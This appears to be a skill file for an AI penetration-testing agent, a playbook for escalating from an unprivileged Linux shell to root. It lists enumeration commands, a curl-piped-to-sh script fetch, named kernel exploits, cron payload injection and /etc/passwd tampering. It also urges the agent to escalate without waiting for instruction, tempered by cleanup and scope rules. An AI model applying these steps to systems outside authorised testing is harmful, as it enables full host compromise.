---
name: linux-privilege-escalation
description: The Linux privilege-escalation playbook — how to go from an unprivileged foothold (e.g. www-data via RCE) to root, SYSTEMATICALLY and without waiting to be told where to look. Use the moment you have any shell/command execution on a Linux host. Fixes the failure mode where the harness gets a foothold then stalls, or thrashes on one vector; gives an ordered enumeration→exploit method and the exact local tools.
metadata:
  category: platforms
  platform: linux
  pairs_with: file-write-rce
  attack_ids: [T1068, T1548, T1053, T1055]
---

# Linux Privilege Escalation

You have execution as an unprivileged user. Your job now is **root** — do not stop
at the foothold. Work this in order; enumerate FIRST, then exploit the
highest-signal vector. When one vector dead-ends, PIVOT — do not grind it.

## 1. Enumerate automatically FIRST (don't hand-roll)

Upload and run a real enum script; triage its RED/HIGH findings before anything
else. These are provisioned locally at `/opt/privesc/`:
- **linpeas**: `/opt/privesc/linpeas.sh` — most thorough; look for red/yellow "95%"
  items. Deliver it to the target and run: `curl <you>/linpeas.sh | sh` or drop it
  via your write primitive and `sh linpeas.sh`.
- **lse**: `/opt/privesc/lse.sh -l1` — lighter, cleaner triage.
- **pspy**: `/opt/privesc/pspy64` — watch for **root cron / scheduled commands**
  running world-writable scripts (no root needed to watch).

## 2. Work the vectors in impact order

1. **sudo -l** — NOPASSWD entries → **GTFOBins** (`sudo <bin>` escape to root).
2. **SUID/SGID**: `find / -perm -4000 -o -perm -2000 2>/dev/null` → GTFOBins for
   each unusual binary.
3. **Kernel exploit** — `uname -a`; match the version to a known local-root:
   - **5.8–5.16 → Dirty Pipe (CVE-2022-0847)** — the go-to for these kernels.
   - pkexec present → **PwnKit (CVE-2021-4034)**.
   - older → DirtyCow (CVE-2016-5195).
   Compile ON the target when glibc versions differ (a locally-built binary often
   fails with `GLIBC_2.xx not found` — build in the target's environment).
4. **Cron abuse**: a root cron running a **world-writable** script or `chown`/
   `tar *`-in-a-writable-dir → inject a payload (e.g. make a SUID bash) and wait
   for the tick.
5. **Writable sensitive files**: `/etc/passwd` (add a root user), `/etc/shadow`,
   `/etc/cron.d`, `/etc/sudoers.d`, service configs, **group membership**
   (`/etc/group`).
6. **Capabilities**: `getcap -r / 2>/dev/null` (`cap_setuid+ep` → root).
7. **Credential reuse**: try any recovered password against `su <user>` and ssh;
   grep configs / history / `.bak` / backups for plaintext creds.

## 3. Prove, then STOP and CLEAN UP

Prove root minimally (`id` showing `euid=0`, read the root flag) — do NOT deploy
persistence. Then **reverse everything you changed**: remove any SUID bit you set
(`chmod u-s`), restore any file you edited (`/etc/group`, cron, configs) to its
ORIGINAL bytes, and delete every uploaded script/exploit/webshell. Verify the
revert (re-read the file) — a partial cleanup that leaves a modified system file
or a live shell is a do-no-harm failure. If a cleanup command is blocked by the
red-lines gate, STOP and ask the operator — do NOT reword it to slip past the gate.

## Restraint

This is exploitation — stay in scope, prove impact minimally, retain no data
beyond evidence, and never leave the target more exposed than you found it.
